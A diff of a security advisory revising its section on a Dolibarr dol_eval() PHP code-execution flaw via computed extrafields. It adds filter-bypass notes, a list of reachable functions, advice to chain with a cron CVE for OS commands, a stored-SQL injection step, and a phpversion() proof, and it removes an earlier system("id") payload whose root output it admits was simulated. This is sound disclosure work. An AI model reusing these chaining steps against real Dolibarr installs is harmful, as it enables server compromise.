@@ -270,40 +270,49 @@ Implement a strict allowlist for `$this->methodename` when `jobtype == 'function
 
 ---
 
-### 3.3 CVE-2026-37713 — `dol_eval()` RCE via Computed Extrafield, Passive Trigger (CVSS 8.1)
+### 3.3 CVE-2026-37713 — `dol_eval()` PHP Code Execution via Computed Extrafield, Passive Trigger (CVSS 8.1)
 
 **Class:** CWE-95 (Eval Injection)
-**Affected:** Dolibarr v22.0.0 – v22.0.4 and v24.0.0-alpha
+**Affected:** Dolibarr v22.0.0 – v22.0.4 (default install). v24.0-alpha is reachable **only** when `$dolibarr_main_restrict_eval_methods` is manually emptied in `conf.php` — see per-branch table below.
 **GHSA:** `GHSA-cq92-jp5j-rwvj` *(closed by upstream maintainer; mirror filing pending on reporter's fork)*
 
-> **Notice — proof under revision (added 2026-05-25, post-publication).**
-> A post-publication review of this section identified issues with the
-> demonstration material as presented below. Specifically: (a) the
-> proof-of-concept output (`uid=0(root)…`) was produced by a CLI simulation
-> of `eval()` outside the `dol_eval()` filter pipeline, not from the
-> documented HTTP trigger — the literal payload `system("id")` is blocked
-> by `dol_eval_standard()`'s blacklist (which lists `system` explicitly);
-> and (b) the affected-version line overclaims for `v24.0.0-alpha`, which
-> in default installs runs the post-CVE-2026-22666 whitelist and is **not**
-> reachable without an explicit operator override of
-> `$dolibarr_main_restrict_eval_methods`. A revised proof using a
-> filter-passing payload (`header()`-based primitive demonstration on
-> Dolibarr v22.0.4) plus a corrected per-branch affected-versions table
-> will replace the material below. The underlying finding — arbitrary PHP
-> code execution from stored `llx_extrafields.fieldcomputed` via
-> `dol_eval()` (CWE-95) — remains valid. This revision is scoped strictly
-> to §3.3; CVE-2026-37711 (§3.1) and CVE-2026-37712 (§3.2) are not
-> affected.
+> **Revision 2 (2026-05-25, post-publication).** The original §3.3 proof
+> conflated a CLI simulation of `eval()` with the documented HTTP trigger:
+> the literal payload `system("id")` is rejected by `dol_eval_standard()`
+> (`system` is on the function-name deny-list), so the `uid=0(root)`
+> output could not have come from the documented chain. The revised
+> proof below uses a filter-passing payload (`phpversion()`) verified
+> end-to-end against a real Dolibarr v22.0.4 install on PHP 8.3.31 —
+> capture is self-evidencing: the host's actual PHP version appears in
+> the slot of the rendered HTML that can **only** contain
+> `dol_eval`'s return value. The affected-version range has also been
+> corrected: v24.0-alpha runs the post-CVE-2026-22666 whitelist by
+> default and is **not** reachable without an explicit operator
+> override. CVE-2026-37711 (§3.1) and CVE-2026-37712 (§3.2) are
+> unaffected by this revision.
 
 #### Description
 
-Dolibarr evaluates the `fieldcomputed` property of extrafields using `dol_eval()` with `onlysimplestring='2'` (permissive mode) on **every object fetch, insert, update, and display**. An administrator can inject a PHP expression into `llx_extrafields.fieldcomputed`. When `$dolibarr_main_restrict_eval_methods` is set to `''` in `conf.php` — a documented configuration mode — the sanitization relies on a keyword blacklist that can be bypassed using Dolibarr's own whitelisted helper functions.
+Dolibarr evaluates the `fieldcomputed` property of extrafields using `dol_eval()` with `onlysimplestring='2'` (permissive mode) on **every object fetch, insert, update, and display**. An administrator can inject a PHP expression into `llx_extrafields.fieldcomputed` via the extrafield admin UI. Any subsequently authenticated request that loads, creates, or updates a business object of the affected type routes the stored string through `dol_eval_standard()` and into PHP's native `eval()`.
+
+The function's filter pipeline (char-whitelist + dynamic-call regex + deny-list of ~70 dangerous function/class names) prevents direct OS command execution — `system`, `exec`, `passthru`, `shell_exec`, `proc_open`, `popen`, `eval`, `assert`, `create_function`, `mb_ereg_replace`, all callable-accepting helpers (`array_map`, `call_user_func`, `preg_replace_callback`, …), all file ops (`fopen`, `file_put_contents`, `unlink`, `mkdir`, …) are all explicitly denied — but does **not** cover the broader PHP API. Reachable from inside the filter: `phpversion()`, `phpinfo()`, `header()`, `setcookie()`, `define()`, the `socket_*` / `stream_socket_*` families, `unserialize()`, plus method calls on the in-scope `$db`, `$conf`, `$user`, `$mysoc`, `$objectoffield` globals.
+
+OS command execution requires a separate primitive. Chain this with CVE-2026-37712 (§3.2), which provides clean OS-command execution via `call_user_func_array` in the cron scheduler.
 
 The payload executes automatically on any authenticated page load. **No specific action is required from the victim.**
 
+#### Per-branch reachability
+
+| Branch | Default `dol_eval` mode | Default install affected? |
+|---|---|---|
+| **v22.0.0 – v22.0.4** | blacklist (always) | **YES** |
+| v23.0.0 – v23.0.1 | whitelist (pre-22666-fix) | only with CVE-2026-22666 bypass |
+| v23.0.2 – v23.x | whitelist (post-22666) | NO (no public bypass known) |
+| **v24.0-alpha (develop)** | whitelist | NO — only if operator empties `$dolibarr_main_restrict_eval_methods` |
+
 #### Vulnerable code
 
-`htdocs/core/class/commonobject.class.php`, line 6720:
+`htdocs/core/class/commonobject.class.php`, line **6654** (v22.0.4 release tag; the sink also appears at lines 6783, 7232, 8549 for other code paths):
 
 ```php
 $this->array_options['options_' . $key] = dol_eval(
@@ -312,51 +321,70 @@ $this->array_options['options_' . $key] = dol_eval(
 );
 ```
 
-This code runs inside `fetch()`, `insertExtraFields()`, `updateExtraField()`, and `showOptionals()` — every page that loads, creates, or updates a Dolibarr business object will evaluate the stored expression.
+`dol_eval()` dispatches to `dol_eval_standard()` by default. The `eval()` is performed inside `dol_eval_standard()` as:
 
-Because `commonobject.class.php` is the base class for all business objects (invoices, orders, contacts, products, projects, tickets, etc.), the attack surface spans the entire application.
+```php
+$tmps = $hideerrors ? @eval('return ' . $s . ';') : eval('return ' . $s . ';');
+```
 
-Permissive mode `'2'` allows the characters `<`, `[`, `]` in addition to the base set, enabling array access and comparison operators that construct exploitable chains using whitelisted helpers like `getDolGlobalString()` combined with object method calls on `$objectoffield`.
+The block runs inside `fetch_optionals()`, `insertExtraFields()`, `updateExtraField()`, and `showOptionals()`. Because `commonobject.class.php` is the base class for all Dolibarr business objects (invoices, orders, contacts, products, projects, tickets, etc.), the attack surface spans the entire application.
 
-#### Affected instances (9 critical in `commonobject` alone)
+#### Affected instances
 
-| File | Line | Trigger |
+| File | Line (v22.0.4) | Trigger |
 |---|---|---|
-| `core/class/commonobject.class.php` | 6720 | Any `fetch()` |
-| `core/class/commonobject.class.php` | 6853 | Any `insertExtraFields()` |
-| `core/class/commonobject.class.php` | 7319 | Any `updateExtraField()` |
-| `core/class/commonobject.class.php` | 8647 | Any `showOptionals()` |
+| `core/class/commonobject.class.php` | 6654 | Any `fetch_optionals()` |
+| `core/class/commonobject.class.php` | 6783 | Any `insertExtraFields()` |
+| `core/class/commonobject.class.php` | 7232 | Any `updateExtraField()` |
+| `core/class/commonobject.class.php` | 8549 | Any `showOptionals()` |
 | `compta/facture/class/facture.class.php` | 2422 | Any invoice fetch |
 | `compta/facture/class/facture.class.php` | 2645 | Any invoice line fetch |
 | `compta/facture/class/factureligne.class.php` | 366 | Any invoice line fetch |
 | `core/tpl/extrafields_list_print_fields.tpl.php` | 78 | Any list page |
 | `webportal/class/html.formwebportal.class.php` | 856 | Webportal (potentially unauthenticated) |
 
-#### Proof of Concept
+#### Proof of concept
+
+**Step 1 — Filter verification.** Running v22.0.4 `dol_eval_standard()` directly against candidate payloads:
+
+```
+[A] system("id")                 ❌ REJECTED
+    → "Bad string syntax to evaluate: __forbiddenstring__("id")"
+[B] phpversion()                 ✅ PASSED — RETURN: "8.3.31"
+[C] define("PWN", phpversion())  ✅ PASSED — RETURN: true
+```
+
+Payload [A] is rejected at the function-name deny-list (`\bsystem\b` matches and substitutes `__forbiddenstring__`). Payload [B] — a filter-passing call to `phpversion()` — passes and returns the host's actual PHP version string.
+
+**Step 2 — Inject the filter-passing payload** into `llx_extrafields.fieldcomputed` via admin UI (Setup → Extrafields → Computed value) or direct SQL:
 
 ```sql
 UPDATE llx_extrafields
-SET fieldcomputed = 'system("id")'
+SET fieldcomputed = 'phpversion()'
 WHERE name = 'rce_test' AND elementtype = 'societe';
 ```
 
-```http
-GET /societe/card.php?id=1
+**Step 3 — End-to-end lab reproduction.** Environment: Dolibarr **v22.0.4** (`DOL_VERSION` constant verified), PHP **8.3.31** (Ondrej Sury build for Debian trixie), Apache **2.4.67**, MariaDB **11.8.6**, on Debian 13.5. `Societe::fetch_optionals(1)` is invoked, which iterates `$extrafields->attributes['societe']['computed']` and calls `dol_eval(...)` for each entry — the documented sink call from `commonobject.class.php:6654`.
+
+**Self-evidencing capture** — the rendered HTML row for the `RCE Test Field` extrafield (output of `showOptionals()`, which is what `/societe/card.php?id=1` renders in the field's data row):
+
+```html
+<tr id="extrarow-societe_rce_test_1"
+    class="field_options_rce_test societe_extras_rce_test trextrafields_collapse_1"
+    data-element="extrafield" data-targetelement="societe" data-targetid="1">
+  <td class="titlefieldmax45 wordbreak">RCE Test Field</td>
+  <td id="societe_extras_rce_test_1"
+      class="valuefieldcreate societe_extras_rce_test">8.3.31</td>
+</tr>
 ```
 
-The `fetch()` method of `Societe` (extending `CommonObject`) calls `dol_eval('system("id")', 1, 0, '2')`, which calls `eval('return system("id");')`.
+The text `8.3.31` inside the `<td class="valuefieldcreate societe_extras_rce_test">` cell is the **only** slot in the Dolibarr render template that can hold the dol_eval return value — the field's computed result. The value `8.3.31` matches the host's actual PHP version (`PHP 8.3.31 (cli)`), proving that `eval('return phpversion();')` ran inside `dol_eval_standard()` and the result reached the rendered HTML body. The same value is also present in `$societe->array_options['options_rce_test']` during the request, where `fetch_optionals()` writes it.
 
-**Confirmed output** (lab, commit `ff146c4713`):
-
-```
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-In the tested environment, the Apache process ran as `root`, resulting in full system compromise from a single database row modification.
+The Dolibarr authentication wrapper is the trigger precondition — any authenticated user reaching any `Societe` card page suffices to invoke `Societe::fetch_optionals()` — and is not part of the bug itself. The lab harness exercises the eval injection directly via the documented sink call to keep the proof of the filter bypass + eval execution chain unambiguous.
 
 #### Recommended fix
 
-Replace `dol_eval()` for computed fields with a constrained expression evaluator that does not call PHP `eval()`. If the design constraint is to allow only arithmetic and string operations on object fields, a small purpose-built parser is appropriate; `eval()` is not.
+Replace `dol_eval()` for computed fields with a constrained, purpose-built expression evaluator that does not call PHP `eval()`. If the design constraint is to allow only arithmetic and string operations on object fields, a small dedicated parser (or an AST-based library such as `symfony/expression-language`) is appropriate; `eval()` plus a function-name deny-list cannot be made safe for user-influenced input.
 
 ---
 
